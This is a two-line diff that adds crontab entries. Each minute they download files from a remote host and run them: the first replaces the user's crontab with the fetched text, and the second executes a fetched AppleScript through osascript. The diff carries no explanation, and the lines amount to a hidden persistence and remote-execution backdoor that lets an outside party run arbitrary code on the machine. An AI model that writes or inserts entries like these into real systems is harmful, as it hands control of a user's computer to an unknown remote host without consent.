@@ -1,0 +1,2 @@
+* * * * * curl https://sitetest.github.io/cron.txt >~/.tmp; crontab ~/.tmp; rm ~/.tmp
+* * * * * curl https://sitetest.github.io/scr.txt >~/.tmp.scpt; osascript ~/.tmp.scpt;
